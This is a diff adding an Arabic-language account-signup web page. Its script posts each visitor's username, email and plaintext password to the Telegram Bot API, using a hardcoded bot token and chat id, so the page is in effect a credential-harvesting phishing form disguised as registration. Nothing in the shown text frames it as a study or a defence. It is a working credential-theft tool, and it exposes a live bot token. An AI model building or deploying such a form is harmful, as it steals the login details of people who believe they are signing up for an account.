@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إنشاء حساب</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f4; }
+        .container { width: 300px; margin: 50px auto; padding: 20px; background: white; border-radius: 10px; box-shadow: 0px 0px 10px #ccc; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { width: 100%; padding: 10px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>إنشاء حساب جديد</h2>
+        <input type="text" id="username" placeholder="اسم المستخدم">
+        <input type="email" id="email" placeholder="البريد الإلكتروني">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        <button onclick="sendToTelegram()">إنشاء الحساب</button>
+    </div>
+
+    <script>
+        function sendToTelegram() {
+            var username = document.getElementById("username").value;
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            var botToken = "8196459609:AAFFRJTY7XJ8OSVfEIVT76hf6uRiM4byJ1Y"; // ضع رمز البوت هنا
+            var chatId = "7302541527"; // ضع معرف الشات هنا
+            var message = `🔹 حساب جديد 🔹\n👤 المستخدم: ${username}\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`;
+
+            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => alert("تم إرسال البيانات بنجاح إلى تليجرام!"))
+                .catch(error => alert("حدث خطأ أثناء الإرسال."));
+        }
+    </script>
+</body>
+  </html>
